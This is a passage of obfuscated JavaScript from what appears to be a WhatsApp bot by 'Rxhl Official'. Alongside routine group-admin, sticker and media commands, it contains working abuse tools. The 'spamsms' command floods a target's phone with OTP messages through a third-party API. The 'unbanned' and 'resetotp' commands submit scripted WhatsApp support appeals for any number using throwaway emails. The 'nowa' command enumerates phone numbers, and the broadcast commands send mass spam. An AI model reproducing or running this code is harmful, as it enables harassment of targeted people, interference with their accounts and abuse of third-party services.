          let _0x45cdc5 = '' + q;
          _0x41d276("*Send a message to " + _0x205914.length + " people, time is over " + _0x205914.length * 3 + " second*");
          for (let _0x5ee442 of _0x205914) {
            await sleep(5000);
            const _0x1f76f5 = {
              text: '' + _0x45cdc5
            };
            const _0x2958ef = {
              quoted: _0x18a4d7
            };
            _0x2f9d2e.sendMessage(_0x5ee442, _0x1f76f5, _0x2958ef);
          }
          _0x41d276("*Successfully sent message To " + _0x205914.length + " person*");
        }
        break;
      case "bcgroup":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x2a2cee) {
            return _0x41d276(global.notext);
          }
          await _0x333a9e();
          let _0x32c474 = await _0x2f9d2e.groupFetchAllParticipating();
          let _0x48a42d = Object.entries(_0x32c474).slice(0).map(_0x2ff159 => _0x2ff159[1]);
          let _0x2c56c3 = _0x48a42d.map(_0x283b2d => _0x283b2d.id);
          _0x41d276("Send Broadcast To " + _0x2c56c3.length + " Group Chat, End Time " + _0x2c56c3.length * 1.5 + " second");
          for (let _0x1cd1e1 of _0x2c56c3) {
            await sleep(1500);
            const _0x6cd473 = {
              text: '' + _0x2a2cee
            };
            const _0x5cae99 = {
              quoted: _0x18a4d7
            };
            _0x2f9d2e.sendMessage(_0x1cd1e1, _0x6cd473, _0x5cae99);
          }
          _0x41d276("Successfully Sending Broadcast To " + _0x2c56c3.length + " Group");
        }
        break;
      case "hidetag":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x18a4d7.isGroup) {
            return _0x41d276(global.noingroup);
          }
          await _0x333a9e();
          const _0x5f5cb3 = {
            quoted: _0x18a4d7
          };
          _0x2f9d2e.sendMessage(_0x537416, {
            'text': q ? q : '',
            'mentions': _0x5e087d.map(_0xdf53e0 => _0xdf53e0.id)
          }, _0x5f5cb3);
        }
        break;
      case "kick":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x18a4d7.isGroup) {
            return _0x41d276(global.noingroup);
          }
          if (!_0x283f1a) {
            return _0x41d276(global.nobotadmin);
          }
          if (!_0x23083c) {
            return _0x41d276(global.usernoadmin);
          }
          await _0x333a9e();
          let _0x5e6a3d = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : _0x2a2cee.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x2f9d2e.groupParticipantsUpdate(_0x537416, [_0x5e6a3d], "remove");
        }
        break;
      case "add":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x18a4d7.isGroup) {
            return _0x41d276(global.noingroup);
          }
          if (!_0x283f1a) {
            return _0x41d276(global.nobotadmin);
          }
          if (!_0x23083c) {
            return _0x41d276(global.usernoadmin);
          }
          await _0x333a9e();
          let _0x3383ee = _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : _0x2a2cee.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x2f9d2e.groupParticipantsUpdate(_0x537416, [_0x3383ee], "add");
        }
        break;
      case "promote":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x18a4d7.isGroup) {
            return _0x41d276(global.noingroup);
          }
          if (!_0x283f1a) {
            return _0x41d276(global.nobotadmin);
          }
          if (!_0x23083c) {
            return _0x41d276(global.usernoadmin);
          }
          await _0x333a9e();
          let _0xcf6350 = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : _0x2a2cee.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x2f9d2e.groupParticipantsUpdate(_0x537416, [_0xcf6350], "promote");
        }
        break;
      case "demote":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x18a4d7.isGroup) {
            return _0x41d276(global.noingroup);
          }
          if (!_0x283f1a) {
            return _0x41d276(global.nobotadmin);
          }
          if (!_0x23083c) {
            return _0x41d276(global.usernoadmin);
          }
          await _0x333a9e();
          let _0x10809d = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : _0x2a2cee.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x2f9d2e.groupParticipantsUpdate(_0x537416, [_0x10809d], "demote");
        }
        break;
      case "editsubjek":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x18a4d7.isGroup) {
            return _0x41d276(global.noingroup);
          }
          if (!_0x283f1a) {
            return _0x41d276(global.nobotadmin);
          }
          if (!_0x23083c) {
            return _0x41d276(global.usernoadmin);
          }
          if (!_0x2a2cee) {
            return _0x41d276(global.notext);
          }
          await _0x333a9e();
          await _0x2f9d2e.groupUpdateSubject(_0x537416, _0x2a2cee);
        }
        break;
      case "editdesk":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x18a4d7.isGroup) {
            return _0x41d276(global.noingroup);
          }
          if (!_0x283f1a) {
            return _0x41d276(global.nobotadmin);
          }
          if (!_0x23083c) {
            return _0x41d276(global.usernoadmin);
          }
          if (!_0x2a2cee) {
            return _0x41d276(global.notext);
          }
          await _0x333a9e();
          await _0x2f9d2e.groupUpdateDescription(_0x537416, _0x2a2cee);
        }
        break;
      case "linkgroup":
      case "linkgc":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x18a4d7.isGroup) {
            return _0x41d276(global.noingroup);
          }
          if (!_0x283f1a) {
            return _0x41d276(global.nobotadmin);
          }
          await _0x333a9e();
          let _0x416311 = await _0x2f9d2e.groupInviteCode(_0x537416);
          const _0x4d5909 = {
            detectLink: true
          };
          _0x2f9d2e.sendText(_0x537416, "https://chat.whatsapp.com/" + _0x416311 + "\n\nLink Group : " + _0x468496.subject, _0x18a4d7, _0x4d5909);
        }
        break;
      case "resetlinkgc":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!_0x18a4d7.isGroup) {
          return _0x41d276(global.noingroup);
        }
        if (!_0x283f1a) {
          return _0x41d276(global.nobotadmin);
        }
        await _0x333a9e();
        _0x2f9d2e.groupRevokeInvite(_0x537416);
        break;
      case "public":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          _0x2f9d2e["public"] = true;
          _0x41d276("Sukse Change To Public");
        }
        break;
      case "self":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          _0x2f9d2e["public"] = false;
          _0x41d276("Sukse Change To Self");
        }
        break;
      case "unbanned":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          if (_0x18a4d7.quoted || q) {
            tosend = _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            targetnya = tosend.split('@')[0];
            try {
              axioss = require("axios");
              ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/");
              email = "wegilab946@wikinoir.com";
              cookie = ntah.headers["set-cookie"].join("; ");
              cheerio = require("cheerio");
              $ = cheerio.load(ntah.data);
              $form = $("form");
              url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
              form = new URLSearchParams();
              form.append("jazoest", $form.find("input[name=jazoest]").val());
              form.append("lsd", $form.find("input[name=lsd]").val());
              form.append("step", "submit");
              form.append("country_selector", '+');
              form.append("phone_number", '+' + targetnya);
              form.append("email", email[0]);
              form.append("email_confirm", email[0]);
              form.append("platform", "ANDROID");
              form.append("your_message", "Привет WhatsApp Мой номер WhatsApp был заблокирован без причины. Пожалуйста, повторно активируйте мой номер WhatsApp, так как этот номер содержит много моей личной информации, которую я храню на этом номере, а также использую этот номер для своей офисной работы, что очень важно. Пожалуйста, активируйте мой номер WhatsApp как можно скорее. Спасибо.");
              form.append("__user", '0');
              form.append("__a", '1');
              form.append("__csr", '');
              form.append("__req", '8');
              form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0");
              form.append("dpr", '1');
              form.append("__ccg", "UNKNOWN");
              form.append("__rev", "1007735016");
              form.append("__comment_req", '0');
              const _0x29b756 = {
                cookie: cookie
              };
              res = await axioss({
                'url': url,
                'method': "POST",
                'data': form,
                'headers': _0x29b756
              });
              _0x41d276("Please wait for the unbanned process for 12 hours🥺🙏");
              payload = String(res.data);
              if (payload.includes("\"payload\":true")) {} else {
                if (payload.includes("\"payload\":false")) {} else {
                  _0x41d276(util.format(res.data));
                }
              }
            } catch (_0x2286ad) {
              _0x41d276('' + _0x2286ad);
            }
          } else {
            _0x41d276("Insert Number");
          }
        }
        break;
      case "unbannedv2":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          if (_0x18a4d7.quoted || q) {
            tosend = _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            targetnya = tosend.split('@')[0];
            try {
              axioss = require("axios");
              ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/");
              email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777");
              cookie = ntah.headers["set-cookie"].join("; ");
              cheerio = require("cheerio");
              $ = cheerio.load(ntah.data);
              $form = $("form");
              url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
              form = new URLSearchParams();
              form.append("jazoest", $form.find("input[name=jazoest]").val());
              form.append("lsd", $form.find("input[name=lsd]").val());
              form.append("step", "submit");
              form.append("country_selector", '+');
              form.append("phone_number", '+' + targetnya);
              form.append("email", email.data[0]);
              form.append("email_confirm", email.data[0]);
              form.append("platform", "ANDROID");
              form.append("your_message", "Привет, поддержка WhatsApp. Несколько дней назад я открыл приложение WhatsApp, но получил уведомление о том, что моя учетная запись WhatsApp не авторизована, и попросил зарегистрировать новый номер телефона. Почему мой номер не может использовать WhatsApp? Я считаю, что я никогда не нарушал политику WhatsApp, никогда не причинял вреда другим пользователям WhatsApp и использую WhatsApp только для бизнеса своей компании. Пожалуйста, повторно активируйте мой номер WhatsApp, поскольку этот номер содержит важные данные для моего бизнеса и деятельности. Пожалуйста, обработайте мой запрос как можно быстрее.");
              form.append("__user", '0');
              form.append("__a", '1');
              form.append("__csr", '');
              form.append("__req", '8');
              form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0");
              form.append("dpr", '1');
              form.append("__ccg", "UNKNOWN");
              form.append("__rev", "1007735016");
              form.append("__comment_req", '0');
              const _0x544219 = {
                cookie: cookie
              };
              res = await axioss({
                'url': url,
                'method': "POST",
                'data': form,
                'headers': _0x544219
              });
              _0x41d276("Please wait for the unbanned process for 12 hours🥺🙏");
              payload = String(res.data);
              if (payload.includes("\"payload\":true")) {} else {
                if (payload.includes("\"payload\":false")) {} else {
                  _0x41d276(util.format(res.data));
                }
              }
            } catch (_0x17d3b7) {
              _0x41d276('' + _0x17d3b7);
            }
          } else {
            _0x41d276("Insert Number!");
          }
        }
        break;
      case "unbannedv3":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          if (_0x18a4d7.quoted || q) {
            tosend = _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            targetnya = tosend.split('@')[0];
            try {
              axioss = require("axios");
              ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/");
              email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777");
              cookie = ntah.headers["set-cookie"].join("; ");
              cheerio = require("cheerio");
              $ = cheerio.load(ntah.data);
              $form = $("form");
              url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
              form = new URLSearchParams();
              form.append("jazoest", $form.find("input[name=jazoest]").val());
              form.append("lsd", $form.find("input[name=lsd]").val());
              form.append("step", "submit");
              form.append("country_selector", '+');
              form.append("phone_number", '+' + targetnya);
              form.append("email", email.data[0]);
              form.append("email_confirm", email.data[0]);
              form.append("platform", "ANDROID");
              form.append("your_message", "Здравствуйте, доброе утро, WhatsApp. Я пользователь WhatsApp со следующим номером " + targetnya + ". У меня возникла проблема с блокировкой моего номера WhatsApp. Когда я открыл приложение WhatsApp, я получил уведомление: «Эта учетная запись не может использовать приложение WhatsApp». Раньше я отправлял сообщения в чат своей семье только во время работы. и я не считаю, что совершил какое-либо нарушение условий обслуживания WhatsApp. Приношу извинения, я рассматриваю возможность повторной активации заблокированной учетной записи WhatsApp. Спасибо");
              form.append("__user", '0');
              form.append("__a", '1');
              form.append("__csr", '');
              form.append("__req", '8');
              form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0");
              form.append("dpr", '1');
              form.append("__ccg", "UNKNOWN");
              form.append("__rev", "1007735016");
              form.append("__comment_req", '0');
              const _0x3c19b5 = {
                cookie: cookie
              };
              res = await axioss({
                'url': url,
                'method': "POST",
                'data': form,
                'headers': _0x3c19b5
              });
              _0x41d276("Please wait for the unbanned process for 12 hours🥺🙏");
              payload = String(res.data);
              if (payload.includes("\"payload\":true")) {} else {
                if (payload.includes("\"payload\":false")) {} else {
                  _0x41d276(util.format(res.data));
                }
              }
            } catch (_0x25b0ff) {
              _0x41d276('' + _0x25b0ff);
            }
          } else {
            _0x41d276("Insert number!");
          }
        }
        break;
      case "resetotp":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          if (_0x18a4d7.quoted || q) {
            tosend = _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            targetnya = tosend.split('@')[0];
            try {
              axioss = require("axios");
              ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/");
              email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777");
              cookie = ntah.headers["set-cookie"].join("; ");
              cheerio = require("cheerio");
              $ = cheerio.load(ntah.data);
              $form = $("form");
              url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
              form = new URLSearchParams();
              form.append("jazoest", $form.find("input[name=jazoest]").val());
              form.append("lsd", $form.find("input[name=lsd]").val());
              form.append("step", "submit");
              form.append("country_selector", '+');
              form.append("phone_number", '+' + targetnya);
              form.append("email", email.data[0]);
              form.append("email_confirm", email.data[0]);
              form.append("platform", "ANDROID");
              form.append("your_message", "Olá, suporte pelo WhatsApp. Alguém tentou fazer login na minha conta do Whatsapp, então estou desconectado da minha conta do Whatsapp, mas infelizmente não consigo mais fazer login na minha conta do Whatsapp porque tenho que esperar 12 horas para receber o código de verificação. Por favor, redefina meu código de verificação do WhatsApp.");
              form.append("__user", '0');
              form.append("__a", '1');
              form.append("__csr", '');
              form.append("__req", '8');
              form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0");
              form.append("dpr", '1');
              form.append("__ccg", "UNKNOWN");
              form.append("__rev", "1007735016");
              form.append("__comment_req", '0');
              const _0x2623ce = {
                cookie: cookie
              };
              res = await axioss({
                'url': url,
                'method': "POST",
                'data': form,
                'headers': _0x2623ce
              });
              _0x41d276("i have reset the otp on that number and remember it only works if the otp is more than 3 hours🥺🙏");
              payload = String(res.data);
              if (payload.includes("\"payload\":true")) {} else {
                if (payload.includes("\"payload\":false")) {} else {
                  _0x41d276(util.format(res.data));
                }
              }
            } catch (_0x1a50eb) {
              _0x41d276('' + _0x1a50eb);
            }
          } else {
            _0x41d276("Insert number!");
          }
        }
        break;
      case "spamsms":
        {
          if (!_0x4d4b5c) {
            return _0x41d276("*Premium only*");
          }
          await _0x333a9e();
          const _0x46358b = _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : _0x2a2cee.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          if (_0x18a4d7.quoted || _0x2a2cee) {
            if (_0x46358b.startsWith('08')) {
              return _0x41d276("Awali nomor dengan +62");
            }
            let _0x2a6932 = '+' + _0x46358b.replace("@s.whatsapp.net", '');
            let _0x5bdc68 = require("axios")["default"];
            const _0xfda8b9 = {
              "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
            };
            const _0x562945 = {
              phone: _0x2a6932
            };
            for (let _0x590d59 = 0; _0x590d59 < 100; _0x590d59++) {
              const _0x1c03c6 = {
                headers: _0xfda8b9
              };
              _0x5bdc68.post("https://api.myfave.com/api/fave/v1/auth", _0x562945, _0x1c03c6).then(_0x49562e => {
                console.log(_0x49562e);
              })["catch"](_0x1ee43b => {
                console.log('[' + new Date().toLocaleTimeString() + "] Spam (SMS) BY RXHL");
              });
            }
          } else {
            _0x41d276("Use of spam SMS number/reply target message*\nExample of spam SMS +6281214281312");
          }
          _0x41d276("SMS/call spam will be sent to the target number");
        }
        break;
      case "infobot":
        const _0x2c996f = {
          image: _0x3a5321,
          caption: "*Hallo " + _0x4cb438 + "*\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬\n*INFO CREATOR AND BOT*\nCreator: Rxhl Official\nTelegram: @rxhlvro\nBase: Rxhl\nVersi Bot: V9\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬\n\n*SCRIPT DEVELOPED BY RXHL OFFICIAL*"
        };
        infobot = _0x2c996f;
        _0x2f9d2e.sendMessage(_0x537416, infobot);
        break;
      case "sticker":
        if (!_0x38c03a) {
          return _0x41d276("Reply to Video/Image With Caption " + (_0x11f9b4 + _0x63bd7f));
        }
        if (/image/.test(_0x5d666c)) {
          await _0x333a9e();
          let _0x509502 = await _0x38c03a.download();
          const _0x4d298d = {
            packname: global.sticker1,
            author: global.sticker2
          };
          let _0x4e03c8 = await _0x2f9d2e.sendImageAsSticker(_0x537416, _0x509502, _0x18a4d7, _0x4d298d);
          await fs.unlinkSync(_0x4e03c8);
        } else {
          if (/video/.test(_0x5d666c)) {
            if ((_0x38c03a.msg || _0x38c03a).seconds > 11) {
              return _0x41d276("Maximum 10 seconds!");
            }
            let _0x258819 = await _0x38c03a.download();
            const _0x6c5fd2 = {
              packname: global.sticker1,
              author: global.sticker2
            };
            let _0x87f539 = await _0x2f9d2e.sendVideoAsSticker(_0x537416, _0x258819, _0x18a4d7, _0x6c5fd2);
            await fs.unlinkSync(_0x87f539);
          } else {
            return _0x41d276("Send Images/Videos With Caption " + (_0x11f9b4 + _0x63bd7f) + "\nVideo Duration 1-9 Seconds");
          }
        }
        break;
      case "attp":
        if (_0xe61016.length == 0) {
          return _0x41d276(global.notext);
        }
        await _0x333a9e();
        ini_txt = _0xe61016.join(" ");
        ini_buffer = await getBuffer("https://api.lolhuman.xyz/api/" + _0x63bd7f + "?apikey=haikalgans&text=" + ini_txt);
        const _0x7b36cc = {
          sticker: ini_buffer
        };
        const _0x208fb5 = {
          quoted: _0x18a4d7
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x7b36cc, _0x208fb5);
        break;
      case "smeme":
        if (!_0x2a2cee) {
          return _0x41d276(global.notext);
        }
        if (!_0x38c03a) {
          throw "Reply to Image With Caption " + (_0x11f9b4 + _0x63bd7f);
        }
        if (/image/.test(_0x5d666c)) {
          await _0x333a9e();
          mee = await _0x2f9d2e.downloadAndSaveMediaMessage(_0x38c03a);
          mem = await _0xb3bae(mee);
          kaytid = await getBuffer("https://api.memegen.link/images/custom/-/" + _0x2a2cee + ".png?background=" + mem);
          const _0x51e1de = {
            packname: global.sticker1,
            author: global.sticker2
          };
          _0x2f9d2e.sendImageAsSticker(_0x537416, kaytid, _0x18a4d7, _0x51e1de);
        }
        break;
      case "inspect":
      case "getidgrup":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x2a2cee) {
            return _0x41d276("Link?");
          }
          let _0x36971a = _0xe61016.join(" ");
          let _0x30be90 = _0x36971a.split("https://chat.whatsapp.com/")[1];
          if (!_0x30be90) {
            return _0x41d276("Link Invalid");
          }
          const _0x3bb710 = {
            type: "get",
            xmlns: "w:g2",
            to: "@g.us"
          };
          const _0x592d82 = {
            code: _0x30be90
          };
          const _0x225ee8 = {
            tag: "invite",
            attrs: _0x592d82
          };
          const _0xc13146 = {
            tag: 'iq',
            attrs: _0x3bb710,
            content: [_0x225ee8]
          };
          _0x2f9d2e.query(_0xc13146).then(async _0x1281d6 => {
            tekse = '' + (_0x1281d6.content[0].attrs.id ? _0x1281d6.content[0].attrs.id : "undefined");
            _0x41d276(tekse);
          });
        }
        break;
      case "startytmp3":
        {
          if (!q) {
            return _0x41d276("Example : " + (_0x11f9b4 + _0x63bd7f) + " karna su sayang");
          }
          const _0x1fd550 = require("./lib/ytdl2");
          const {
            fetchBuffer: _0x292f6c
          } = require("./lib/storage2");
          let _0x4bd253 = require("youtube-yts");
          let _0x15c676 = await _0x4bd253(q);
          let _0x4e94a8 = _0x15c676.videos[0];
          const _0x66a82a = await _0x1fd550.mp3(_0x4e94a8.url);
          const _0x512605 = {
            quoted: _0x18a4d7
          };
          await _0x2f9d2e.sendMessage(_0x537416, {
            'audio': fs.readFileSync(_0x66a82a.path),
            'fileName': _0x4e94a8.title + ".mp3",
            'mimetype': "audio/mp4",
            'ptt': true,
            'contextInfo': {
              'externalAdReply': {
                'title': _0x4e94a8.title,
                'body': "Rxhl Official",
                'thumbnail': await _0x292f6c(_0x66a82a.meta.image),
                'mediaType': 0x2,
                'mediaUrl': _0x4e94a8.url
              }
            }
          }, _0x512605);
          await fs.unlinkSync(_0x66a82a.path);
        }
        break;
      case "yts":
      case "ytsearch":
        {
          if (!q) {
            return _0x41d276("Example : " + (_0x11f9b4 + _0x63bd7f) + " story wa anime");
          }
          yts = require("yt-search");
          search = await yts(q);
          nyaabanaayts = "YouTube Search\n\n Result From " + q + "\n\n";
          no = 1;
          for (let _0x134cac of search.all) {
            hasilpencarian = nyaabanaayts + "\nNo : " + no++ + "\n Type : " + _0x134cac.type + "\n Video ID : " + _0x134cac.videoId + "\n Title : " + _0x134cac.title + "\n Views : " + _0x134cac.views + "\n Duration : " + _0x134cac.timestamp + "\n Uploaded : " + _0x134cac.ago + "\n Url : " + _0x134cac.url + "\n\n─────────────────\n\n";
          }
          const _0x5382dc = {
            url: search.all[0].thumbnail
          };
          const _0x56ed9c = {
            image: _0x5382dc,
            caption: hasilpencarian
          };
          const _0x1f39b6 = {
            quoted: _0x18a4d7
          };
          _0x2f9d2e.sendMessage(_0x537416, _0x56ed9c, _0x1f39b6);
        }
        break;
      case "style":
      case "styletext":
        {
          let {
            styletext: _0x2a8fb5
          } = require("./lib/scraper");
          if (!q) {
            return _0x41d276("Enter Query text!");
          }
          let _0x1b666f = await _0x2a8fb5(q);
          let _0x4595f9 = "Style Text From " + q + "\n\n";
          for (let _0x398074 of _0x1b666f) {
            _0x4595f9 += '*' + _0x398074.name + "* : " + _0x398074.result + "\n\n";
          }
          _0x41d276(_0x4595f9);
        }
        break;
      case "fliptext":
        {
          if (_0xe61016.length < 1) {
            return _0x41d276("Example:\n" + _0x11f9b4 + "fliptext rxhl");
          }
          quere = _0xe61016.join(" ");
          flipe = quere.split('').reverse().join('');
          _0x41d276("```「 FLIP TEXT 」```\n*•> Normal :*\n" + quere + "\n*•> Flip :*\n" + flipe);
        }
        break;
      case "setppbot":
      case "setbotpp":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x38c03a) {
            return _0x41d276("Send/Reply Image With Caption " + (_0x11f9b4 + _0x63bd7f));
          }
          if (!/image/.test(_0x5d666c)) {
            return _0x41d276("Send/Reply Image With Caption " + (_0x11f9b4 + _0x63bd7f));
          }
          if (/webp/.test(_0x5d666c)) {
            return _0x41d276("Send/Reply Image With Caption " + (_0x11f9b4 + _0x63bd7f));
          }
          var _0x252404 = await _0x2f9d2e.downloadAndSaveMediaMessage(_0x38c03a);
          if (_0xe61016[0] == "/full") {
            var {
              img: _0x269855
            } = await generateProfilePicture(_0x252404);
            const _0x1c6235 = {
              to: _0xffbfb1,
              type: "set",
              xmlns: "w:profile:picture"
            };
            const _0x1032be = {
              tag: "picture",
              attrs: {},
              content: _0x269855
            };
            _0x1032be.attrs.type = "image";
            const _0x33be6f = {
              tag: 'iq',
              attrs: _0x1c6235,
              content: [_0x1032be]
            };
            await _0x2f9d2e.query(_0x33be6f);
            fs.unlinkSync(_0x252404);
            _0x41d276("Success");
          } else {
            fs.unlinkSync(_0x252404);
            _0x41d276("Success");
          }
        }
        break;
      case "tiktokgirl":
        _0x41d276("Tunggu");
        asupan = JSON.parse(fs.readFileSync("./lib/tiktok/tiktokgirl.json"));
        hasil = asupan[Math.floor(Math.random() * asupan.length)];
        const _0x1d7a4a = {
          url: hasil.url
        };
        const _0x126e7b = {
          caption: "Sukses",
          video: _0x1d7a4a
        };
        const _0x5479ad = {
          quoted: _0x18a4d7
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x126e7b, _0x5479ad);
        break;
      case "tiktokghea":
        _0x41d276("Tunggu");
        asupan = JSON.parse(fs.readFileSync("./lib/tiktok/gheayubi.json"));
        hasil = asupan[Math.floor(Math.random() * asupan.length)];
        const _0x3690bc = {
          url: hasil.url
        };
        const _0x310ceb = {
          caption: "Sukses",
          video: _0x3690bc
        };
        const _0x2eec78 = {
          quoted: _0x18a4d7
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x310ceb, _0x2eec78);
        break;
      case "tiktoknukhty":
        _0x41d276("Tunggu");
        asupan = JSON.parse(fs.readFileSync("./lib/tiktok/ukhty.json"));
        hasil = asupan[Math.floor(Math.random() * asupan.length)];
        const _0xcbd9db = {
          url: hasil.url
        };
        const _0x111dff = {
          caption: "Sukses",
          video: _0xcbd9db
        };
        const _0x70705c = {
          quoted: _0x18a4d7
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x111dff, _0x70705c);
        break;
      case "tiktoksantuy":
        _0x41d276("Tunggu");
        asupan = JSON.parse(fs.readFileSync("./lib/tiktok/santuy.json"));
        hasil = asupan[Math.floor(Math.random() * asupan.length)];
        const _0x3944ed = {
          url: hasil.url
        };
        const _0x642e3c = {
          caption: "Sukses",
          video: _0x3944ed
        };
        const _0xfb2879 = {
          quoted: _0x18a4d7
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x642e3c, _0xfb2879);
        break;
      case "tiktokkayes":
        _0x41d276("Tunggu");
        asupan = JSON.parse(fs.readFileSync("./lib/tiktok/kayes.json"));
        hasil = asupan[Math.floor(Math.random() * asupan.length)];
        const _0x2bb579 = {
          url: hasil.url
        };
        const _0x2a9bcf = {
          caption: "Sukses",
          video: _0x2bb579
        };
        const _0x13f605 = {
          quoted: _0x18a4d7
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x2a9bcf, _0x13f605);
        break;
      case "tiktokpanrika":
        _0x41d276("Tunggu");
        asupan = JSON.parse(fs.readFileSync("./lib/tiktok/panrika.json"));
        hasil = asupan[Math.floor(Math.random() * asupan.length)];
        const _0x55d8cd = {
          url: hasil.url
        };
        const _0x48e6e5 = {
          caption: "Sukses",
          video: _0x55d8cd
        };
        const _0x6f9643 = {
          quoted: _0x18a4d7
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x48e6e5, _0x6f9643);
        break;
      case "tiktoknotnot":
        _0x41d276("Tunggu");
        asupan = JSON.parse(fs.readFileSync("./lib/tiktok/notnot.json"));
        hasil = asupan[Math.floor(Math.random() * asupan.length)];
        const _0x4b31c2 = {
          url: hasil.url
        };
        const _0xc817ad = {
          caption: "Sukses",
          video: _0x4b31c2
        };
        const _0x5dc315 = {
          quoted: _0x18a4d7
        };
        _0x2f9d2e.sendMessage(_0x537416, _0xc817ad, _0x5dc315);
        break;
      case "nowa":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!q) {
            return _0x41d276("insert Number, example: " + (_0x11f9b4 + _0x63bd7f) + " 62853388888xxx");
          }
          var _0x57813a = _0xe61016[0];
          if (!_0x57813a.includes('x')) {
            return _0x41d276("Enter the suffix x to find the number?");
          }
          var _0x2be94a = _0x57813a.split('x')[0];
          var _0x596737 = _0x57813a.split('x')[_0x57813a.split('x').length - 1] ? _0x57813a.split('x')[_0x57813a.split('x').length - 1] : '';
          var _0x2e6f94 = _0x57813a.split('x').length - 1;
          if (_0x2e6f94 > 4) {
            return _0x41d276("Maaf, hanya bisa mencari nomor dengan maksimal 4 x");
          }
          var _0x5b0072;
          _0x41d276("Loading");
          if (_0x2e6f94 == 1) {
            _0x5b0072 = 10;
          } else {
            if (_0x2e6f94 == 2) {
              _0x5b0072 = 100;
            } else {
              if (_0x2e6f94 == 3) {
                _0x5b0072 = 1000;
              } else if (_0x2e6f94 == 4) {
                _0x5b0072 = 10000;
              }
            }
          }
          var _0x1fbf17 = "\nWithout Bio / Default bio.\n";
          var _0x5ed7bb = "\nNot registered on whatsapp\n";
          var _0x112f2b = {};
          for (let _0x5a37fd = 0; _0x5a37fd < _0x5b0072; _0x5a37fd++) {
            var _0x1cb41c = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
            var _0x404f64 = _0x1cb41c[Math.floor(Math.random() * _0x1cb41c.length)];
            var _0x5676bc = _0x1cb41c[Math.floor(Math.random() * _0x1cb41c.length)];
            var _0x226300 = _0x1cb41c[Math.floor(Math.random() * _0x1cb41c.length)];
            var _0x34086d = _0x1cb41c[Math.floor(Math.random() * _0x1cb41c.length)];
            var _0x1feb98;
            if (_0x2e6f94 == 1) {
              _0x1feb98 = '' + _0x404f64;
            } else {
              if (_0x2e6f94 == 2) {
                _0x1feb98 = '' + _0x404f64 + _0x5676bc;
              } else {
                if (_0x2e6f94 == 3) {
